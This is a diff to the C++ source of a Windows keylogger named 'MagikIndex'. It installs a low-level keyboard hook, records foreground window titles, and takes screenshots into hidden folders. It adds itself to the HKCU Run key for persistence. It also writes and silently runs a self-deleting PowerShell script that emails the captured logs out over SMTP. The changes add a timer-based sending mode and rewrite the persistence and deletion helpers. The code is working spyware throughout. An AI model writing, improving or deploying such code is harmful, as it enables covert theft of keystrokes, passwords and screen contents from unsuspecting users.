@@ -265,10 +265,7 @@ Log:
         SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
         if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
-            std::string Command = "/C del /f /q ";
-            Command += DestinationFile;
-            Command += "\\*.*";
-            ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+            DeleteDirectory(DestinationFile);
             MyLog.LogItChar("Cleaned MagikIndex folder...");
             Sleep(200);
         }
@@ -291,7 +288,7 @@ Log:
         CopiedFileText += ".exe\"...";
         MyLog.LogItChar(CopiedFileText);
 
-        RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
+        CreateRegistryKey("MagikIndex", DestinationFile.c_str());
 
         MyLog.LogItChar("Registered executable for startup...");
 
@@ -526,15 +523,33 @@ Log:
 
     MyLog.LogItChar("\n_____________________________________________\n");
 
+
     std::thread t1(Hooker, WH_KEYBOARD_LL, KeyboardThread);
+    std::thread t2(TimerThread);
+    t2.detach();
+    t1.detach();
     //t1.detach();
     Sleep(50);
+    char OldWindowTitle[256];
+    char WindowTitle[256];
     while (!mutex) {
+        GetWindowTextA(GetForegroundWindow(), WindowTitle, sizeof(WindowTitle));
+        if (strcmp(WindowTitle, OldWindowTitle) != 0) {
+            memset(OldWindowTitle, 0, sizeof(OldWindowTitle));
+            strcpy(OldWindowTitle, WindowTitle);
+            std::string ContextSwitchText = "[Switched to \"";
+            ContextSwitchText += WindowTitle;
+            ContextSwitchText += "\"]";
+            MyLog.LogItChar(ContextSwitchText);
+            Counter += ContextSwitchText.size();
+        }
         Sleep(50);
     }
-    t1.join();
     MyLog.LogItChar("\n_____________________________________________\n");
-    MyLog.LogItChar("Character limit hit, sending MyLog...");
+    if (LogMode == 2)
+        MyLog.LogItChar("Character limit hit, sending log...");
+    else if (LogMode == 1)
+        MyLog.LogItChar("Timer limit hit, sending log...");
 
     MyLog.SendLog();
     FirstLog = false;
@@ -543,17 +558,13 @@ Log:
     return 0;
 }
 
-int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
+void DeleteDirectory(std::string dir)
 {
-    int len = (int)strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
-    char* tempdir = (char*)malloc(len);
-    memset(tempdir, 0, len);
-    strcpy(tempdir, dir);
-
+    dir += "\0";
     SHFILEOPSTRUCTA file_op = {
       NULL,
       FO_DELETE,
-      tempdir,
+      dir.c_str(),
       NULL,
       FOF_NOCONFIRMATION |
       FOF_NOERRORUI |
@@ -561,9 +572,8 @@ int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the dire
       false,
       0,
       "" };
-    int ret = SHFileOperationA(&file_op);
-    free(tempdir);
-    return ret; // returns 0 on success, non zero on failure.
+    SHFileOperationA(&file_op);
+    return;
 }
 
 
@@ -716,7 +726,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
     DWORD DWFlags;
 
     while (1) {
-        SilentlyRemoveDirectory(ScreenshotDir.c_str());
+        DeleteDirectory(ScreenshotDir);
         std::this_thread::sleep_for(std::chrono::minutes(1));
         CreateDirectoryA(ScreenshotDir.c_str(), NULL);
         SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
@@ -789,11 +799,12 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
             WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
             CloseHandle(PS1File);
-            Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+            Command = SysDir;
+            Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
             Command += Powershell;
             Command += "\"";
             if (!InternetGetConnectedState(&DWFlags, NULL)) {
-                RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
+                CreateRegistryKey(PSStartup.c_str(), Command.c_str());
             }
             else {
                 ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
@@ -834,44 +845,19 @@ int CalculateDirSize(std::string DirectoryToCheck) {
 }
 
 
-BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
+void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe)
 {
     HKEY hKey = NULL;
-    LONG lResult = 0;
-    BOOL fSuccess = TRUE;
-    DWORD dwSize;
-
-    const size_t count = MAX_PATH * 2;
-    char szValue[count] = {};
-
+    char szValue[MAX_PATH] = {};
 
     strcpy_s(szValue, "\"");
-    strcat_s(szValue, pathToExe);
+    strcat_s(szValue, PathToExe);
     strcat_s(szValue, "\" ");
 
-    if (args != NULL)
-    {
-        strcat_s(szValue, args);
-    }
-
-    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
-
-    fSuccess = (lResult == 0);
-
-    if (fSuccess)
-    {
-        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
-        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
-        fSuccess = (lResult == 0);
-    }
-
-    if (hKey != NULL)
-    {
-        RegCloseKey(hKey);
-        hKey = NULL;
-    }
-
-    return fSuccess;
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+    RegSetValueExA(hKey, AppName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue) + 1);
+    RegCloseKey(hKey);
+    return;
 }
 
 ULONG WINAPI Protect(LPVOID Parameter) {
@@ -957,7 +943,9 @@ LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam)
                 mutex = true;
                 ExitThread(0);
             }
-            Counter++;
+            if(LogMode == 2){
+                Counter++;
+            }
             MyLog.LogItInt(keyboard->vkCode);
 
             break;
@@ -984,7 +972,7 @@ int Hooker(int HookType, HOOKPROC CallbackFunc)
         DispatchMessage(&msg);
     }
 
-    UnhookWindowsHookEx(hhkLowLevelKybd);
+    UnhookWindowsHookEx(hhkLowLevelKybd);            //unhook regardless of mutex state if the thread is forced to close
 
     return(0);
 }
@@ -1018,6 +1006,14 @@ LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lPa
         Counter2++;
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+void TimerThread() {
+    std::this_thread::sleep_for(std::chrono::minutes(LogTimer));
+    if(LogMode == 1){
+        Counter = CharactersPerLog;
+    }
+    ExitThread(0);
 }
 
 #pragma warning( pop )
